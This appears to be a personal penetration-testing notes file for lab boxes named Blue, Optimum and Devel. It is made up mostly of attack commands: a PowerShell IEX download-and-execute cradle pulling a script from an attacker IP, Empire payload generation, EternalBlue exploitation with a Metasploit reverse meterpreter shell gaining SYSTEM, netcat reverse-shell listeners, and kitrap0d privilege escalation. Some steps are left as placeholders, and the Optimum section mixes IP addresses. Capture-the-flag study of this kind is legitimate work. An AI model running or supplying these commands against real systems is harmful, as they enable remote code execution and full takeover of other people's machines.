# Tools and tricks

## Kali on VirtualBox
- `apt-get upgrade`
- `apt-get dist-upgrade`
- `apt-get install -y virtualbox-guest-x11`
- install guest additions 
- reboot

## Firefox ESR + FoxyProxy + Burps
Install version 4.6.5 that can run on Firefox ESR v52.5.0 (32-bit) using it with Burp v1.7.27

## Get files
Get file with Powershell:
```
C:\Windows\system32>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.22:80/file.ps1')"
```

## Serve files
With Python:
```
# python -m SimpleHTTPServer 80
```

## Empire
[Empire github](https://github.com/EmpireProject/Empire/tree/dev)
### Setup
```
git clone https://github.com/EmpireProject/Empire -b dev # Clone the dev branch
cd Empire/setup
./install/sh
./empire.sh
```
### Usage
```
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://10.10.14.22:443
(Empire: listeners/http) > set Port 443
(Empire: listeners/http) > execute
[*] Starting listener 'http'
[+] Listener successfully started!
(Empire: listeners/http) > back
(Empire: listeners) > launcher powershell http # this generates the payload
```
Copy the payload output and paste it into a file that you'll serve with `SimpleHTTPServer` and get from the box using `Net.WebClient.downloadString` for example.

# Boxes
## Blue
### Recon
```
# nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.40 -oA blue.vuln_and_safe.nmap
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```
### Exploit
```
# msfconsole
msf > search ms17-010                                                                              
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
msf exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.10.40
msf exploit(windows/smb/ms17_010_eternalblue) > exploit -j
msf > sessions -i 1

meterpreter > shell
C:\Windows\system32>whoami
nt authority\system
```

## Optimum

### Tools
- [nishang `Invoke-PowerShellTcp.ps1`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
- [rasta-mouse `Sherlock.ps1`](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)
- [Empire `Invoke-MS16032.ps1`](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)

### Procedure
- `nmap -sC -sV -oA devel.nmap 10.10.10.5`
    - Discovered port 80
- Browse to http://10.10.10.8
    - Found <SOFTWARE> <VERSION>
        - Vulnerable to <XYZ>
- Set Burp in Intercept mode on 127.0.0.1:8080
- Set FoxyProxy to redirect to Burp
- Search for `%00` in the searchbox
- In Burp, send the GET to Repeater (`CTRL + R + R`) and modify it as: `QUERY`

- Start `python -m SimpleHTTPServer`
- Start netcat to capture the reverse shell `nc -lnvp 1337`
- Execute the GET query in Burp
    - Look for a GET request in SimpleHTTPServer and 
    - You should get a Powershell running as normal user

###
- User Sherlock to identify unpatched vulnerabilities
    - Discovered MS16032   

### Escalate
- Edit `Invoke-MS16032.ps1`:
`SHOWFILE`
- Start netcat to capture the Empire reverse shell `nc -lnvp 1338`
- From the open Powershell session, get the Empire script
    - Obtained privileged shell



## Devel
- nmap
    - Discovered anonymous FTP
        - `ftp 10.10.10.5` user: `anonymous` passowrd: anything.
- msfvenom to build a meterpreter
- upload it via ftp
- start msfconsole to listen
- visit the page to trigger 
```
msf exploit(multi/handler) > search suggest
msf exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > run  
```
## Get a shell
```
msf exploit(windows/local/ms10_015_kitrap0d) > use exploit/multi/handler
msf exploit(multi/handler) > run
```
- Browse the page to spawn the shell
```
meterpreter > background
msf exploit(multi/handler) > sessions
```
## Get an elevated shell
```
msf exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf exploit(windows/local/ms10_015_kitrap0d) > show options
msf exploit(windows/local/ms10_015_kitrap0d) > set session 4
msf exploit(windows/local/ms10_015_kitrap0d) > run
meterpreter > shell
c:\windows\system32\inetsrv>whoami
```